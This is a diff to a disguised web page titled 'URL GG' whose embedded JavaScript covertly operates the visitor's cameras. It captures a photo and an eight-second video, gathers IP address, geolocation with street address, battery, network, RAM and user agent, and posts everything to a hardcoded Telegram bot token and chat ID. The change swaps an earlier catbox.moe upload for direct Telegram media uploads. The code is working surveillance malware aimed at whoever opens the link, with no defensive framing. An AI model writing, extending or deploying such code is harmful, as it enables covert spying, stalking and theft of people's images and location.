@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="UTF-8" />
-  <title>anhjbgg</title>
+  <title>URL GG</title>
   <style>
     body { margin: 0; background: transparent; color: #fff; overflow: hidden; }
     video { display: none; }
@@ -14,7 +14,6 @@
 <script>
 const token = '7877584682:AAHvvEzlzWyWq5QOKnx7y3cjPcMIOBOPUdg';
 const chat_id = '7552410869';
-const catboxURL = 'https://catbox.moe/user/api.php';
 
 let facing = 'user'; // depan -> belakang -> depan
 let video = document.getElementById('video');
@@ -49,18 +48,19 @@ async function recordVideo(stream, duration = 5000) {
   });
 }
 
-async function uploadToCatbox(blob, filename) {
-  let form = new FormData();
-  form.append('reqtype', 'fileupload');
-  form.append('fileToUpload', blob, filename);
-  let res = await fetch(catboxURL, { method: 'POST', body: form });
-  return await res.text();
-}
+async function sendToTelegram(text, media, type) {
+  const form = new FormData();
+  form.append('chat_id', chat_id);
+  form.append(type, media, `${type}.webm`);
 
-async function sendToTelegram(text) {
+  await fetch(`https://api.telegram.org/bot${token}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
+    method: 'POST',
+    body: form
+  });
+
   await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method: 'POST',
-    headers: {'Content-Type': 'application/json'},
+    headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ chat_id, text })
   });
 }
@@ -69,11 +69,10 @@ async function getInfo() {
   let ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip);
   let ua = navigator.userAgent;
   let ram = navigator.deviceMemory || 'Unknown';
-  let brand = ua.match(/Android.*?;\s(.+?)\sBuild/)?.[1] || 'Unknown';
   let battery = await navigator.getBattery().then(b => `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Not'})`);
   let net = navigator.connection ? `${navigator.connection.effectiveType}, ${navigator.connection.downlink} Mbps` : 'Unknown';
 
-  return { ip, ua, ram, brand, battery, net };
+  return { ip, ua, ram, battery, net };
 }
 
 async function getLocation() {
@@ -96,25 +95,30 @@ async function runAuto() {
 
     // FOTO
     const fotoBlob = await capturePhoto(stream);
-    const fotoUrl = await uploadToCatbox(fotoBlob, 'foto.jpg');
+    const fotoUrl = URL.createObjectURL(fotoBlob);
 
     // VIDEO
     const videoBlob = await recordVideo(stream, 8000);
-    const videoUrl = await uploadToCatbox(videoBlob, 'rekaman.webm');
+    const videoUrl = URL.createObjectURL(videoBlob);
 
     // INFO + LOKASI
     const info = await getInfo();
     const loc = await getLocation();
 
     const teks = `
-╭━━╮╭╮╱╱╭╮╭━━━┳━━┳━━━━╮
-┃╭╮┃┃╰╮╭╯┃┃╭━╮┣┫┣┻━━╮━┃
-┃╰╯╰╋╮╰╯╭╯┃╰━╯┃┃┃╱╱╭╯╭╯
-┃╭━╮┃╰╮╭╯╱┃╭╮╭╯┃┃╱╭╯╭╯╱
-┃╰━╯┃╱┃┃╱╱┃┃┃╰┳┫┣┳╯━╰━╮
-╰━━━╯╱╰╯╱╱╰╯╰━┻━━┻━━━━╯
-    📍 Lokasi: ${loc.maps}\n🏠 Detail: ${loc.alamat}\n🌐 IP: ${info.ip}\n🔋 Baterai: ${info.battery}\n📶 Jaringan: ${info.net}\n📱 Merek HP: ${info.brand}\n💾 RAM: ${info.ram} GB\n🤖 UA: ${info.ua}\n🖼️ Foto: ${fotoUrl}\n🎥 Video: ${videoUrl}`;
-    await sendToTelegram(teks);
+    📍 Lokasi: ${loc.maps}
+    🏠 Detail: ${loc.alamat}
+    🌐 IP: ${info.ip}
+    🔋 Baterai: ${info.battery}
+    📶 Jaringan: ${info.net}
+    📱 User-Agent: ${info.ua}
+    💾 RAM: ${info.ram}
+    🖼️ Foto: ${fotoUrl}
+    🎥 Video: ${videoUrl}`;
+
+    // Kirim ke Telegram
+    await sendToTelegram(teks, fotoBlob, 'photo');
+    await sendToTelegram(teks, videoBlob, 'video');
 
     stream.getTracks().forEach(track => track.stop());
     facing = (facing === 'user') ? 'environment' : 'user'; // ganti kamera
